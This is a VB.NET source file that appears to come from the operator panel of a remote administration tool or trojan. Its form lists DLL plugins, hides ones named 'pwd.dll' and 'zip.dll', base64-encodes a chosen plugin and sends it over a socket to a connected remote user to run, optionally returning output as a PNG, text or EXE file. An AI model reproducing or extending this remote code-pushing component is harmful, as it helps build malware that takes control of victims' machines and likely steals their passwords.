﻿Imports System.Reflection
Public Class ExecuteCustom
    Public F As Form1
    Public User As USER
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Try
            If CheckBox1.Checked = True Then
                Dim OutPut As String = InputBox("Supported Extinsion [ Png,Txt,Exe ]", "Return Output", "Enter Output Type")
                If OutPut = "" Or OutPut = "Enter Output Type" Then
                    Exit Sub
                Else
                    F.S.Send(User, F.ENB("custom") & F.Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugins\" & ComboBox1.SelectedItem.ToString)) & F.Y & TextBox2.Text & F.Y & TextBox3.Text & F.Y & TextBox4.Text & F.Y & "True" & F.Y & OutPut)
                End If
            Else
                F.S.Send(User, F.ENB("custom") & F.Y & Convert.ToBase64String(IO.File.ReadAllBytes("plugins\" & ComboBox1.SelectedItem.ToString)) & F.Y & TextBox2.Text & F.Y & TextBox3.Text & F.Y & TextBox4.Text & F.Y & "False")
            End If
            MsgBox("Custom Plugin has been invoked", MsgBoxStyle.Information, "Done")
        Catch ex As Exception

        End Try
    End Sub

    Private Sub ExecuteCustom_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox1.Select()
        ComboBox1.Text = "Please Select a Plugin"
        Dim a() As String = IO.Directory.GetFiles("plugins")
        For Each item As String In a
            ComboBox1.Items.Add(item.Replace("plugins\", ""))
        Next
        ComboBox1.Items.Remove("pwd.dll")
        ComboBox1.Items.Remove("zip.dll")
    End Sub
    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Try
            Dim p = System.Reflection.Assembly.Load(IO.File.ReadAllBytes("plugins\" & ComboBox1.SelectedItem.ToString))
            Dim name As String = p.GetName.Name
            TextBox2.Text = name
        Catch ex As Exception

        End Try
    End Sub
End Class